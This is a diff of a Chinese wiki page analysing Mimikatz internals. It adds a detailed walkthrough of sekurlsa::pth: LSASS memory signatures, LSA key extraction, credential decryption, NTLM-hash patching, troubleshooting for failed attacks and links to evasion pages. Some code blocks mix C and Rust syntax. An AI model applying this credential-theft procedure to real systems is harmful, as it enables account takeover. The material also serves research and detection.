@@ -1,7 +1,7 @@
 ---
 title: Mimikatz 模块调度架构与黄金票据生成核心实现深度解析
 description: 深度解析 Mimikatz 模块调度架构（KUHL_M 结构）与黄金票据生成核心函数 kuhl_m_kerberos_golden 的源码实现，涵盖命令行解析分发、加密体系选型、PAC
-  构造及 BER 编码序列化全流程。
+  构造及 BER 编码序列化全流程。新增 sekurlsa::pth 模块交叉引用，补全 Pass-the-Hash 内存补丁攻击面的技术细节索引。
 category: program-analysis
 tags:
 - Mimikatz
@@ -14,8 +14,16 @@ tags:
 - PAC
 - Cryptography
 - Red Teaming
+- sekurlsa
+- Pass-the-Hash
+- LSASS
+- Memory Patching
+- NTLM
+- LSA Protect
+- Rust
+- Credential Theft
 date: 2024-01-15
-updated: '2026-11-14'
+updated: '2026-11-15'
 ---
 
 ## 概述
@@ -27,9 +35,10 @@ updated: '2026-11-14'
 - 黄金票据生成的加密体系选型（DES/RC4/AES128/AES256）
 - PAC（Privilege Attribute Certificate）构造细节
 - Kerberos 凭据的 BER 编码序列化与持久化
+- **新增**：`sekurlsa::pth` 模块通过 LSASS 内存补丁实现 Pass-the-Hash 的底层原理，覆盖 LogonSessionList 定位、LSA Protect 密钥提取、凭据解密与 NTLM hash 替换全流程
 
 > **项目地址**：https://github.com/gentilkiwi/mimikatz  
-> **适用场景**：红队工具开发、Kerberos 协议研究、Windows 认证机制深度分析、恶意代码分析与检测规则编写
+> **适用场景**：红队工具开发、Kerberos/NTLM 协议研究、Windows 认证机制深度分析、恶意代码分析与检测规则编写
 
 ---
 
@@ -74,7 +83,7 @@ NTSTATUS mimikatz_dispatchCommand(wchar_t * input) {
 }
 ```
 
-> **关键点**：`mimikatz_doLocal` 是处理 `kerberos::golden` 等标准模块命令的核心分发函数。
+> **关键点**：`mimikatz_doLocal` 是处理 `kerberos::golden`、`sekurlsa::pth` 等标准模块命令的核心分发函数。
 
 ### 本地命令解析与模块查找：`mimikatz_doLocal`
 
@@ -121,8 +130,8 @@ NTSTATUS mimikatz_doLocal(wchar_t * input) {
 const KUHL_M * mimikatz_modules[] = {
     &kuhl_m_standard,
     &kuhl_m_crypto,
-    &kuhl_m_sekurlsa,
-    &kuhl_m_kerberos,    // <=== Kerberos 模块（索引 3）
+    &kuhl_m_sekurlsa,      // <=== sekurlsa 模块（索引 2）
+    &kuhl_m_kerberos,      // <=== Kerberos 模块（索引 3）
     &kuhl_m_ngc,
     // ... 其余模块 ...
 };
@@ -133,7 +142,7 @@ const KUHL_M * mimikatz_modules[] = {
 ```c
 // kuhl_m.h - 模块元数据结构
 typedef struct _KUHL_M {
-    const wchar_t * shortName;        // 短名称，如 "kerberos"
+    const wchar_t * shortName;        // 短名称，如 "kerberos"、"sekurlsa"
     const wchar_t * fullName;         // 完整名称
     const wchar_t * description;      // 描述
     const unsigned short nbCommands;  // 命令数量
@@ -149,7 +158,7 @@ typedef struct _KUHL_M {
 // kuhl_m.h - 单个命令元数据
 typedef struct _KUHL_M_C {
     const PKUHL_M_C_FUNC pCommand;    // 实现函数指针
-    const wchar_t * command;          // 命令名，如 "golden"
+    const wchar_t * command;          // 命令名，如 "golden"、"pth"
     const wchar_t * description;      // 命令描述
 } KUHL_M_C, *PKUHL_M_C;
 ```
@@ -177,7 +186,29 @@ const KUHL_M_C kuhl_m_c_kerberos[] = {
 };
 ```
 
-> **索引映射**：`kerberos::golden` 对应 `indexModule=3`（`mimikatz_modules[3]`）、`indexCommand=5`（`kuhl_m_c_kerberos[5]`）。
+### sekurlsa 模块注册实例
+
+```c
+// kuhl_m_sekurlsa.c - sekurlsa 模块定义
+const KUHL_M kuhl_m_sekurlsa = {
+    L"sekurlsa", L"Sekurlsa package module", L"",
+    ARRAYSIZE(kuhl_m_c_sekurlsa), kuhl_m_c_sekurlsa,
+    kuhl_m_sekurlsa_init, kuhl_m_sekurlsa_clean
+};
+
+// 命令表（节选）
+const KUHL_M_C kuhl_m_c_sekurlsa[] = {
+    {kuhl_m_sekurlsa_logonpasswords, L"logonpasswords", L"Get logon passwords"},
+    {kuhl_m_sekurlsa_pth,            L"pth",            L"Pass-the-hash"},           // <=== 核心命令
+    {kuhl_m_sekurlsa_msv,            L"msv",            L"MSV credentials"},
+    {kuhl_m_sekurlsa_kerberos,       L"kerberos",       L"Kerberos credentials"},
+    // ... 其余命令 ...
+};
+```
+
+> **索引映射**：
+> - `kerberos::golden` 对应 `indexModule=3`（`mimikatz_modules[3]`）、`indexCommand=5`
+> - `sekurlsa::pth` 对应 `indexModule=2`（`mimikatz_modules[2]`）、`indexCommand=1`
 
 ---
 
@@ -333,7 +364,187 @@ if (BerApp_KrbCred) {
 
 ---
 
-## 四、关键数据结构速查表
+## 四、sekurlsa::pth 模块：Pass-the-Hash 内存补丁攻击面深度解析 {#sekurlsa-pth}
+
+> **交叉引用**：本节内容对应专题页面 `[[mimikatz-sekurlsa-pth-internals]]`，该页面提供纯 Rust 实现参考与更细致的结构体定义。
+
+### 攻击原理概述
+
+`sekurlsa::pth` 通过 **Patch LSASS.exe 进程中 LSASRV.dll 模块空间的内存**，修改指定 Logon Session 对应的 NTLM Hash，实现 Pass-the-Hash。与协议层面的 PTH（如 Impacket）不同，内存补丁方式具备**全覆盖性**：一旦补丁生效，后续该 Logon Session 发起的所有网络认证（SMB、RPC、WinRM、WMI 等）均由 LSASS 自动使用修改后的 Hash，无需单独实现各上层协议。
+
+**核心流程**：
+1. 解析参数（/user、/domain、/ntlm、/aes128、/aes256、/run、/luid、/impersonate）
+2. 若提供 `/luid`：直接定位并修改该 LUID 对应的 Logon Session 凭据
+3. 若无 `/luid`：以 `CREATE_SUSPENDED` + `LOGON_NETCREDENTIALS_ONLY` 启动新进程，获取其 Token 中的 LUID
+4. 通过 `kuhl_m_sekurlsa_acquireLSA` 读取 LSASS 进程中 LSASRV.dll 内存
+5. 通过内存签名定位 `LogonSessionList` 与 `LogonSessionListCount` 全局变量
+6. 遍历双向链表，匹配目标 LUID 的 `KIWI_MSV1_0_LIST_*` 结构
+7. 通过内存签名定位 LSA Protect 密钥（`h3DesKey` / `hAesKey`），解密凭据块
+8. 修改 `MSV1_0_PRIMARY_CREDENTIAL` 结构：清除 LM/SHA/DPAPI 标记，设置 `isNtOwfPassword=1`，写入攻击者提供的 NTLM Hash
+9. 重新加密凭据块，`WriteProcessMemory` 写回 LSASS
+10. `ResumeThread` 恢复目标进程，完成攻击
+
+### 关键参数与分支逻辑
+
+```c
+// kuhl_m_sekurlsa.c - kuhl_m_sekurlsa_pth 入口
+NTSTATUS kuhl_m_sekurlsa_pth(int argc, wchar_t * argv[]) {
+    // 参数获取
+    kull_m_string_args_byName(argc, argv, L"user", &user, L"");
+    kull_m_string_args_byName(argc, argv, L"domain", &domain, L"");
+    kull_m_string_args_byName(argc, argv, L"ntlm", &ntlm, NULL);      // RC4_HMAC_NT
+    kull_m_string_args_byName(argc, argv, L"aes128", &aes128, NULL);  // AES128
+    kull_m_string_args_byName(argc, argv, L"aes256", &aes256, NULL);  // AES256
+    kull_m_string_args_byName(argc, argv, L"run", &run, L"cmd.exe");
+    kull_m_string_args_byName(argc, argv, L"luid", &luidStr, NULL);   // 可选：直接指定 LUID
+    kull_m_string_args_byName(argc, argv, L"impersonate", &impersonate, NULL);
+
+    // 分支 1：指定 LUID -> 直接 Patch 现有 Logon Session
+    if (luidStr) {
+        RtlZeroMemory(&luid, sizeof(LUID));
+        luid.LowPart = wcstoul(luidStr, NULL, 0);
+        status = kuhl_m_sekurlsa_pth_luid(&luid, user, domain, ntlm, aes128, aes256);
+    }
+    // 分支 2：无 LUID -> 启动新进程，获取新 Logon Session
+    else {
+        CreateProcessWithLogonW(user, domain, L"", LOGON_NETCREDENTIALS_ONLY,
+                                run, CREATE_NEW_CONSOLE | CREATE_SUSPENDED, NULL, NULL, &si, &pi);
+        // 获取进程 Token -> TOKEN_STATISTICS.AuthenticationId (LUID)
+        // 调用 kuhl_m_sekurlsa_pth_luid 修改该 LUID 对应的凭据
+        ResumeThread(pi.hThread);
+    }
+}
+```
+
+> **`LOGON_NETCREDENTIALS_ONLY` 关键特性**：创建新 Logon Session 且**不校验凭据有效性**，允许使用空密码启动进程，后续再 Patch 对应 Session 的 Hash。
+
+### LSASS 内存获取：`kuhl_m_sekurlsa_acquireLSA`
+
+```c
+// 核心任务：
+// 1. OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, lsassPid)
+// 2. 读取 PEB -> Ldr -> InMemoryOrderModuleList 遍历模块，定位 LSASRV.dll 基址与大小
+// 3. ReadProcessMemory 读取 LSASRV.dll 完整映像到本地缓冲区
+// 4. 获取 OS 版本（MajorVersion, MinorVersion, BuildNumber），用于后续选择对应内存签名
+```
+
+> **技术细节**：`InMemoryOrderModuleList` 遍历是 Windows 进程内存分析基础技能，`ReadProcessMemory` 跨进程读取需 `PROCESS_VM_READ` 权限。
+
+### LogonSessionList 定位与解析：内存签名机制
+
+Mimikatz 通过 **版本化内存签名** 定位全局变量 `LogonSessionList` 与 `LogonSessionListCount`。签名选取同时引用这两个全局变量的函数中的不变机器码片段。
+
+**签名表结构（节选）**：
+```c
+// 不同 Windows 版本对应的签名与偏移
+pub(crate) const PTRN_WN63_LogonSessionList: &[u8] = &[
+    0x8b, 0xde, 0x48, 0x8d, 0x0c, 0x5b, 0x48, 0xc1, 0xe1, 0x05, 0x48, 0x8d, 0x05,
+];
+pub(crate) const PTRN_WN1703_LogonSessionList: &[u8] = &[
+    0x33, 0xff, 0x45, 0x89, 0x37, 0x48, 0x8b, 0xf3, 0x45, 0x85, 0xc9, 0x74,
+];
+// ...
+pub(crate) const LSA_SRV_REF_BUILD_10_1703: (u32, &[u8], (isize, isize)) = 
+    (WIN_BUILD_10_1703, PTRN_WN1703_LogonSessionList, (23, -4));  // (List偏移, Count偏移)
+```
+
+**64 位相对寻址解析**：
+```c
+// 找到签名在模块内存中的偏移 ptrn_offset
+// 读取签名处相对偏移处的 4 字节 RIP 相对偏移 offset
+read_process_mem(handle, dll_base + ptrn_offset + rel_offset, &offset, 4);
+// 目标全局变量地址 = dll_base + ptrn_offset + rel_offset + 4 + offset
+ptr_logon_session_lst = dll_base + ptrn_offset + rel_offset + 4 + offset;
+```
+
+**LogonSessionList 结构**：指向 `LIST_ENTRY` 双向链表头，每个节点为 `KIWI_MSV1_0_LIST_*`（版本相关，Win10 1607+ 为 `KIWI_MSV1_0_LIST_63`）。
+
+**关键结构体字段偏移（Win10 1607 示例）**：
+| 字段 | 类型 | 说明 |
+|------|------|------|
+| `Flink` / `Blink` | `LIST_ENTRY` | 链表指针 |
+| `LocallyUniqueIdentifier` | `LUID` | Logon Session 唯一标识 |
+| `UserName` | `UNICODE_STRING` | 用户名 |
+| `DomainName` | `UNICODE_STRING` | 域名 |
+| `LogonType` | `ULONG` | 登录类型 |
+| `Credentials` | `PVOID` | 指向加密的 `MSV1_0_PRIMARY_CREDENTIAL` |
+
+### LSA Protect 密钥提取与凭据解密
+
+NT6+ 使用 **AES-CFB**（数据长度模 8 ≠ 0）或 **3DES-CBC**（模 8 = 0）加密凭据。密钥存储在 LSASRV.dll 全局变量 `h3DesKey` / `hAesKey` 中，以 `KIWI_BCRYPT_HANDLE_KEY` 结构引用 `KIWI_BCRYPT_KEY` -> `KIWI_HARD_KEY` -> 明文密钥。
+
+**密钥结构链**：
+```
+h3DesKey/hAesKey (全局指针)
+  -> KIWI_BCRYPT_HANDLE_KEY { tag="UUUR", key: *KIWI_BCRYPT_KEY }
+      -> KIWI_BCRYPT_KEY { tag="MSSK", hardkey: KIWI_HARD_KEY }
+          -> KIWI_HARD_KEY { cbSecret, data[cbSecret] }  // 明文密钥
+```
+
+**提取流程**：
+1. 内存签名定位 `h3DesKey` / `hAesKey` 全局指针地址
+2. `ReadProcessMemory` 读取 `KIWI_BCRYPT_HANDLE_KEY` -> 获取 `key` 指针
+3. 读取 `KIWI_BCRYPT_KEY` -> 验证 tag `MSSK` -> 获取 `hardkey` 偏移
+4. 读取 `KIWI_HARD_KEY` -> 提取 `data` 中的明文密钥（长度 `cbSecret`）
+4. `BCryptOpenAlgorithmProvider` + `BCryptGenerateSymmetricKey` 导入密钥句柄
+5. `BCryptDecrypt` 解密 `Credentials` 指向的凭据块
+
+> **版本差异**：Win8 以前用 `KIWI_BCRYPT_KEY`，Win8~Blue 用 `KIWI_BCRYPT_KEY8`，Blue 以后用 `KIWI_BCRYPT_KEY81`，结构体大小与 `hardkey` 偏移均不同。
+
+### NTLM Hash 补丁与凭据重加密
+
+**解密后的 `MSV1_0_PRIMARY_CREDENTIAL_10_1607` 结构**：
+```c
+struct MSV1_0_PRIMARY_CREDENTIAL_10_1607 {
+    LogonDomainName: UNICODE_STRING,
+    UserName: UNICODE_STRING,
+    pNtlmCredIsoInProc: PVOID,
+    isIso: u8,
+    isNtOwfPassword: u8,      // 是否有 NTLM Hash
+    isLmOwfPassword: u8,      // 是否有 LM Hash
+    isShaOwPassword: u8,      // 是否有 SHA Hash
+    isDPAPIProtected: u8,     // 是否 DPAPI 保护
+    // ... 对齐字段 ...
+    NtOwfPassword: [u8; 16],  // NTLM Hash (MD4)
+    LmOwfPassword: [u8; 16],  // LM Hash
+    ShaOwPassword: [u8; 20],  // SHA Hash
+    DPAPIProtected: [u8; 16], // DPAPI 保护数据
+};
+```
+
+**补丁逻辑**：
+```c
+// 清除除 NTLM 外的所有凭据标记
+credentials[offsetToIsLmOwfPassword] = 0;
+credentials[offsetToIsShaOwPassword] = 0;
+if (offsetToIsIso) credentials[offsetToIsIso] = 0;
+if (offsetToIsDPAPIProtected) {
+    credentials[offsetToIsDPAPIProtected] = 0;
+    memset(&credentials[offsetToDPAPIProtected], 0, 16);
+}
+memset(&credentials[offsetToLmOwfPassword], 0, 16);
+memset(&credentials[offsetToShaOwPassword], 0, 20);
+
+// 设置 NTLM Hash
+credentials[offsetToIsNtOwfPassword] = 1;
+memcpy(&credentials[offsetToNtOwfPassword], attacker_ntlm_hash, 16);
+
+// 重新加密
+nt6_encrypt_mem(credentials, TRUE);  // 使用之前提取的 h3DesKey/hAesKey
+
+// 写回 LSASS
+WriteProcessMemory(hLsass, credentials_ptr_in_lsass, credentials, cred_size, NULL);
+```
+
+> **关键点**：补丁仅修改内存中**该 Logon Session**的凭据，不触及 SAM、注册表或磁盘，重启失效，属于**运行时内存篡改**。
+
+### Kerberos 凭据同步修补
+
+`kuhl_m_sekurlsa_enum_callback_kerberos_pth` 回调同步修改 Kerberos 凭据（`KIWI_KERBEROS_*` 结构），替换 `Key` 字段为对应的 AES/RC4 Key，使 `/ptt` 等 Kerberos 操作同样生效。原理同 MSV：定位链表 -> 解密 -> 替换 Key -> 加密写回。
+
+---
+
+## 五、关键数据结构速查表
 
 | 结构体 | 定义位置 | 核心字段 | 用途 |
 |--------|----------|----------|------|
@@ -344,10 +555,14 @@ if (BerApp_KrbCred) {
 | `PACTYPE` / `PAC_INFO_BUFFER` | `kerberos.h` | `cBuffers`, `Buffers[]` | PAC 容器 |
 | `KERB_VALIDATION_INFO` | `ntsecapi.h` | `UserId`, `GroupIds`, `SidCount`, `ExtraSids` | PAC LogonInfo 核心 |
 | `PBERVAL` | `kull_m_asn1.h` | `bv_val`, `bv_len` | BER 编码结果 |
+| `KIWI_MSV1_0_LIST_63` | `sekurlsa.h` | `Flink`, `LUID`, `UserName`, `Credentials` | Logon Session 节点 |
+| `MSV1_0_PRIMARY_CREDENTIAL` | `sekurlsa.h` | `isNtOwfPassword`, `NtOwfPassword` | 明文凭据结构 |
+| `KIWI_BCRYPT_HANDLE_KEY` | `sekurlsa.h` | `tag`, `key` | LSA Protect 密钥句柄 |
+| `KIWI_HARD_KEY` | `sekurlsa.h` | `cbSecret`, `data` | 明文密钥材料 |
 
 ---
 
-## 五、调试与分析建议
+## 六、调试与分析建议
 
 ### 断点设置建议
 
@@ -357,14 +572,24 @@ if (BerApp_KrbCred) {
 | `mimikatz.c: mimikatz_doLocal()` | 观察模块/命令查找逻辑、`argv` 分离 |
 | `kuhl_m_kerberos.c: kuhl_m_kerberos_golden()` | 核心参数解析、加密体系选型、时间计算 |
 | `kuhl_m_kerberos.c: kuhl_m_kerberos_golden_data()` | PAC 构造、票据加密、BER 编码全流程 |
+| `kuhl_m_sekurlsa.c: kuhl_m_sekurlsa_pth()` | PTH 参数分发、分支选择、进程创建 |
+| `kuhl_m_sekurlsa.c: kuhl_m_sekurlsa_acquireLSA()` | LSASS 句柄获取、LSASRV.dll 映像读取 |
+| `kuhl_m_sekurlsa.c: kuhl_m_sekurlsa_pth_luid()` | LogonSessionList 遍历、LUID 匹配、凭据 Patch |
 | `kull_m_asn1.c: ber_encode_*()` | 观察 ASN.1 编码细节 |
 
 ### 关键变量监控
 
-- `keyType` / `pCSystem->KeySize`：确认加密算法与密钥长度匹配
-- `lifeTimeData` 三个 `FILETIME`：验证时间窗口是否符合预期
-- `pSid` / `netbiosDomain` / `id` / `groups` / `sids` / `pClaimsSet`：PAC 核心字段
-- `BerApp_KrbCred->bv_len`：最终票据大小（通常 8-12 KB，文章提到 9 MB 可能为误记或特殊构造）
+| 变量 | 监控点 | 预期值/校验逻辑 |
+|------|--------|-----------------|
+| `keyType` / `pCSystem->KeySize` | Golden Ticket | 确认加密算法与密钥长度匹配（AES256=32字节, RC4=16字节, DES=8字节） |
+| `lifeTimeData` 三个 `FILETIME` | Golden Ticket | 验证时间窗口是否符合预期、分钟对齐 |
+| `pSid` / `netbiosDomain` / `id` / `groups` / `sids` / `pClaimsSet` | Golden Ticket PAC | PAC 核心字段完整性 |
+| `BerApp_KrbCred->bv_len` | Golden Ticket 输出 | 最终票据大小（通常 8-12 KB） |
+| `luid` (LowPart/HighPart) | PTH 分支 | 与目标进程 Token `AuthenticationId` 一致 |
+| `ptr_logon_session_lst` / `logon_session_lst_cnt` | PTH 内存解析 | 链表头地址非空、计数 > 0 |
+| `h3DesKey` / `hAesKey` 指针值 | LSA Protect 密钥提取 | 非 NULL，指向有效 `KIWI_BCRYPT_HANDLE_KEY` |
+| `credentials[offsetToIsNtOwfPassword]` | PTH 补丁前后 | 补丁前 0 -> 补丁后 1 |
+| `credentials[offsetToNtOwfPassword..+15]` | PTH 补丁前后 | 补丁前全 0/旧 Hash -> 补丁后为攻击者 NTLM Hash |
 
 ### 常见问题排查
 
@@ -374,33 +599,43 @@ if (BerApp_KrbCred) {
 | `CDLocateCSystem` 返回非 0 | 系统不支持该 ETYPE（如 XP 无 AES） | 检查 `pCSystem` 是否为 `NULL`，尝试降级至 RC4 |
 | 生成票据无法使用 | PAC 校验和计算错误、SID 格式错误 | 断点 `kuhl_m_pac_create`、`kuhl_m_pac_sign`，对比真实 TGT PAC 结构 |
 | `.kirbi` 文件损坏 | BER 编码长度字段错误 | 监控 `ber_encode_KRB_CRED` 返回值，检查 `bv_len` 与实际写入长度 |
+| `ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)` | 权限不足（无 `PROCESS_VM_READ`/`PROCESS_QUERY_INFORMATION`） | 以 SYSTEM/管理员运行，或检查 LSASS 保护级别（RunAsPPL） |
+| 内存签名未命中 | Windows 版本/补丁导致 LSASRV.dll 代码变更 | 对比目标系统 LSASRV.dll 反汇编，提取新签名 |
+| `ReadProcessMemory` 返回 0 / `ERROR_PARTIAL_COPY` | LSASS 开启 VBS/HVCI、或地址无效 | 检查目标地址是否在模块范围内，考虑 `MmCopyVirtualMemory` 内核读取 |
+| Patch 后网络认证仍失败 | 未同步修补 Kerberos 凭据、或目标进程非该 Logon Session | 确认 `kuhl_m_sekurlsa_enum_callback_kerberos_pth` 执行，验证进程 Token LUID |
 
 ---
 
-## 六、扩展阅读与关联页面
+## 七、扩展阅读与关联页面
 
-- `[[lm-ntlm-hash-generation-analysis]]` — LM/NTLM Hash 生成算法与 OpenSSL 适配，直接关联 `/krbtgt` 参数值的来源
+- `[[mimikatz-sekurlsa-pth-internals]]` — **本页面新增交叉引用**：深度解析 `sekurlsa::pth` 模块通过 LSASS 内存补丁实现 Pass-the-Hash 的底层原理，覆盖 LogonSessionList 定位、LSA Protect 密钥提取、凭据解密与 NTLM hash 替换全流程，并附纯 Rust 实现参考
+- `[[lm-ntlm-hash-generation-analysis]]` — LM/NTLM Hash 生成算法与 OpenSSL 适配，直接关联 `/krbtgt` 与 `/ntlm` 参数值的来源
 - `[[windows-syscall-internals-sysenter-kifastcallentry]]` — Windows 系统调用机制，理解 LSASS 交互与票据注入底层
 - `[[phantom-dll-hollowing-technique]]` — 内存注入与模块伪装技术，可结合 `/ptt` 免杀思路研究
 - `[[pe-export-table-internals]]` — PE 导出表解析，辅助理解 `CDLocateCSystem` 等内部函数定位方式
 - `[[mfc-message-map-internals-reverse-engineering]]` — MFC 消息映射逆向模式，对比 Mimikatz 自建分发机制的异同
+- `[[argument-spoofing-edr-evasion]]` — 参数欺骗对抗 EDR 进程监控，可结合 `CreateProcessWithLogonW` 启动参数混淆
+- `[[memory-scanning-tools-evasion-techniques]]` — 内存扫描工具检测原理与 UDRL 规避实现，关联 LSASS 内存补丁的检测对抗
 
 ---
 
-## 七、总结
+## 八、总结
 
-Mimikatz 通过 **KUHL_M 模块注册表 + 双层线性查找** 实现了轻量级、可扩展的命令分发架构。黄金票据生成 `kuhl_m_kerberos_golden` 展示了：
+Mimikatz 通过 **KUHL_M 模块注册表 + 双层线性查找** 实现了轻量级、可扩展的命令分发架构。两大核心攻击模块展示了 Windows 认证体系的两面：
 
-1. **参数驱动的加密体系选型**（DES/RC4/AES128/AES256）
-2. **标准化的时间窗口计算**（FILETIME 精度、分钟对齐）
-3. **完整的 PAC 构造流程**（LogonInfo、Checksums、Claims）
-4. **自包含的 BER 编码序列化**（无外部 ASN.1 库依赖）
-5. **双模式输出**（文件落地 `/ticket` 与无文件 `/ptt`）
+| 维度 | `kerberos::golden` (黄金票据) | `sekurlsa::pth` (Pass-the-Hash) |
+|------|-------------------------------|----------------------------------|
+| **协议层** | Kerberos (Ticket-based) | NTLM (Challenge/Response) |
+| **攻击面** | 伪造 KDC 签名的 TGT | 篡改 LSASS 运行时凭据缓存 |
+| **核心原语** | PAC 构造 + BER 编码 + krbtgt 密钥加密 | 内存签名定位 + LSA Protect 解密 + 凭据块重加密 |
+| **持久性** | 票据文件可跨重启复用 | 仅运行时内存生效，重启失效 |
+| **检测面** | 异常 ETYPE、时间窗口、PAC 校验和 | LSASS 内存完整性、异常 `WriteProcessMemory`、凭据字段不一致 |
+| **工具生态** | Rubeus, Kekeo, Impacket | Impacket (协议层), Cobalt Strike (pth) |
 
-理解上述流程不仅有助于红队工具二次开发与免杀，更为 Kerberos 协议安全审计、黄金/白银票据检测规则编写（如基于 PAC 校验和异常、ETYPE 降级、异常时间窗口等）提供了坚实的代码级依据。
+理解上述流程不仅有助于红队工具二次开发与免杀，更为 **Kerberos/NTLM 协议安全审计、黄金票据/PTH 检测规则编写**（如基于 PAC 校验和异常、ETYPE 降级、异常时间窗口、LSASS 内存完整性监控、凭据字段完整性校验等）提供了坚实的代码级依据。
 
 > **安全提示**：本页面仅供安全研究与防御分析使用，请勿用于未授权渗透测试或非法用途。实战中请遵守当地法律法规与授权范围。
 
 ## 来源
 
-- [0x00实验室-202108-202304_028](../sources/0x00实验室-202108-202304_028.md)
+- [0x4d5a-202103-202209_14](../sources/0x4d5a-202103-202209_14.md)
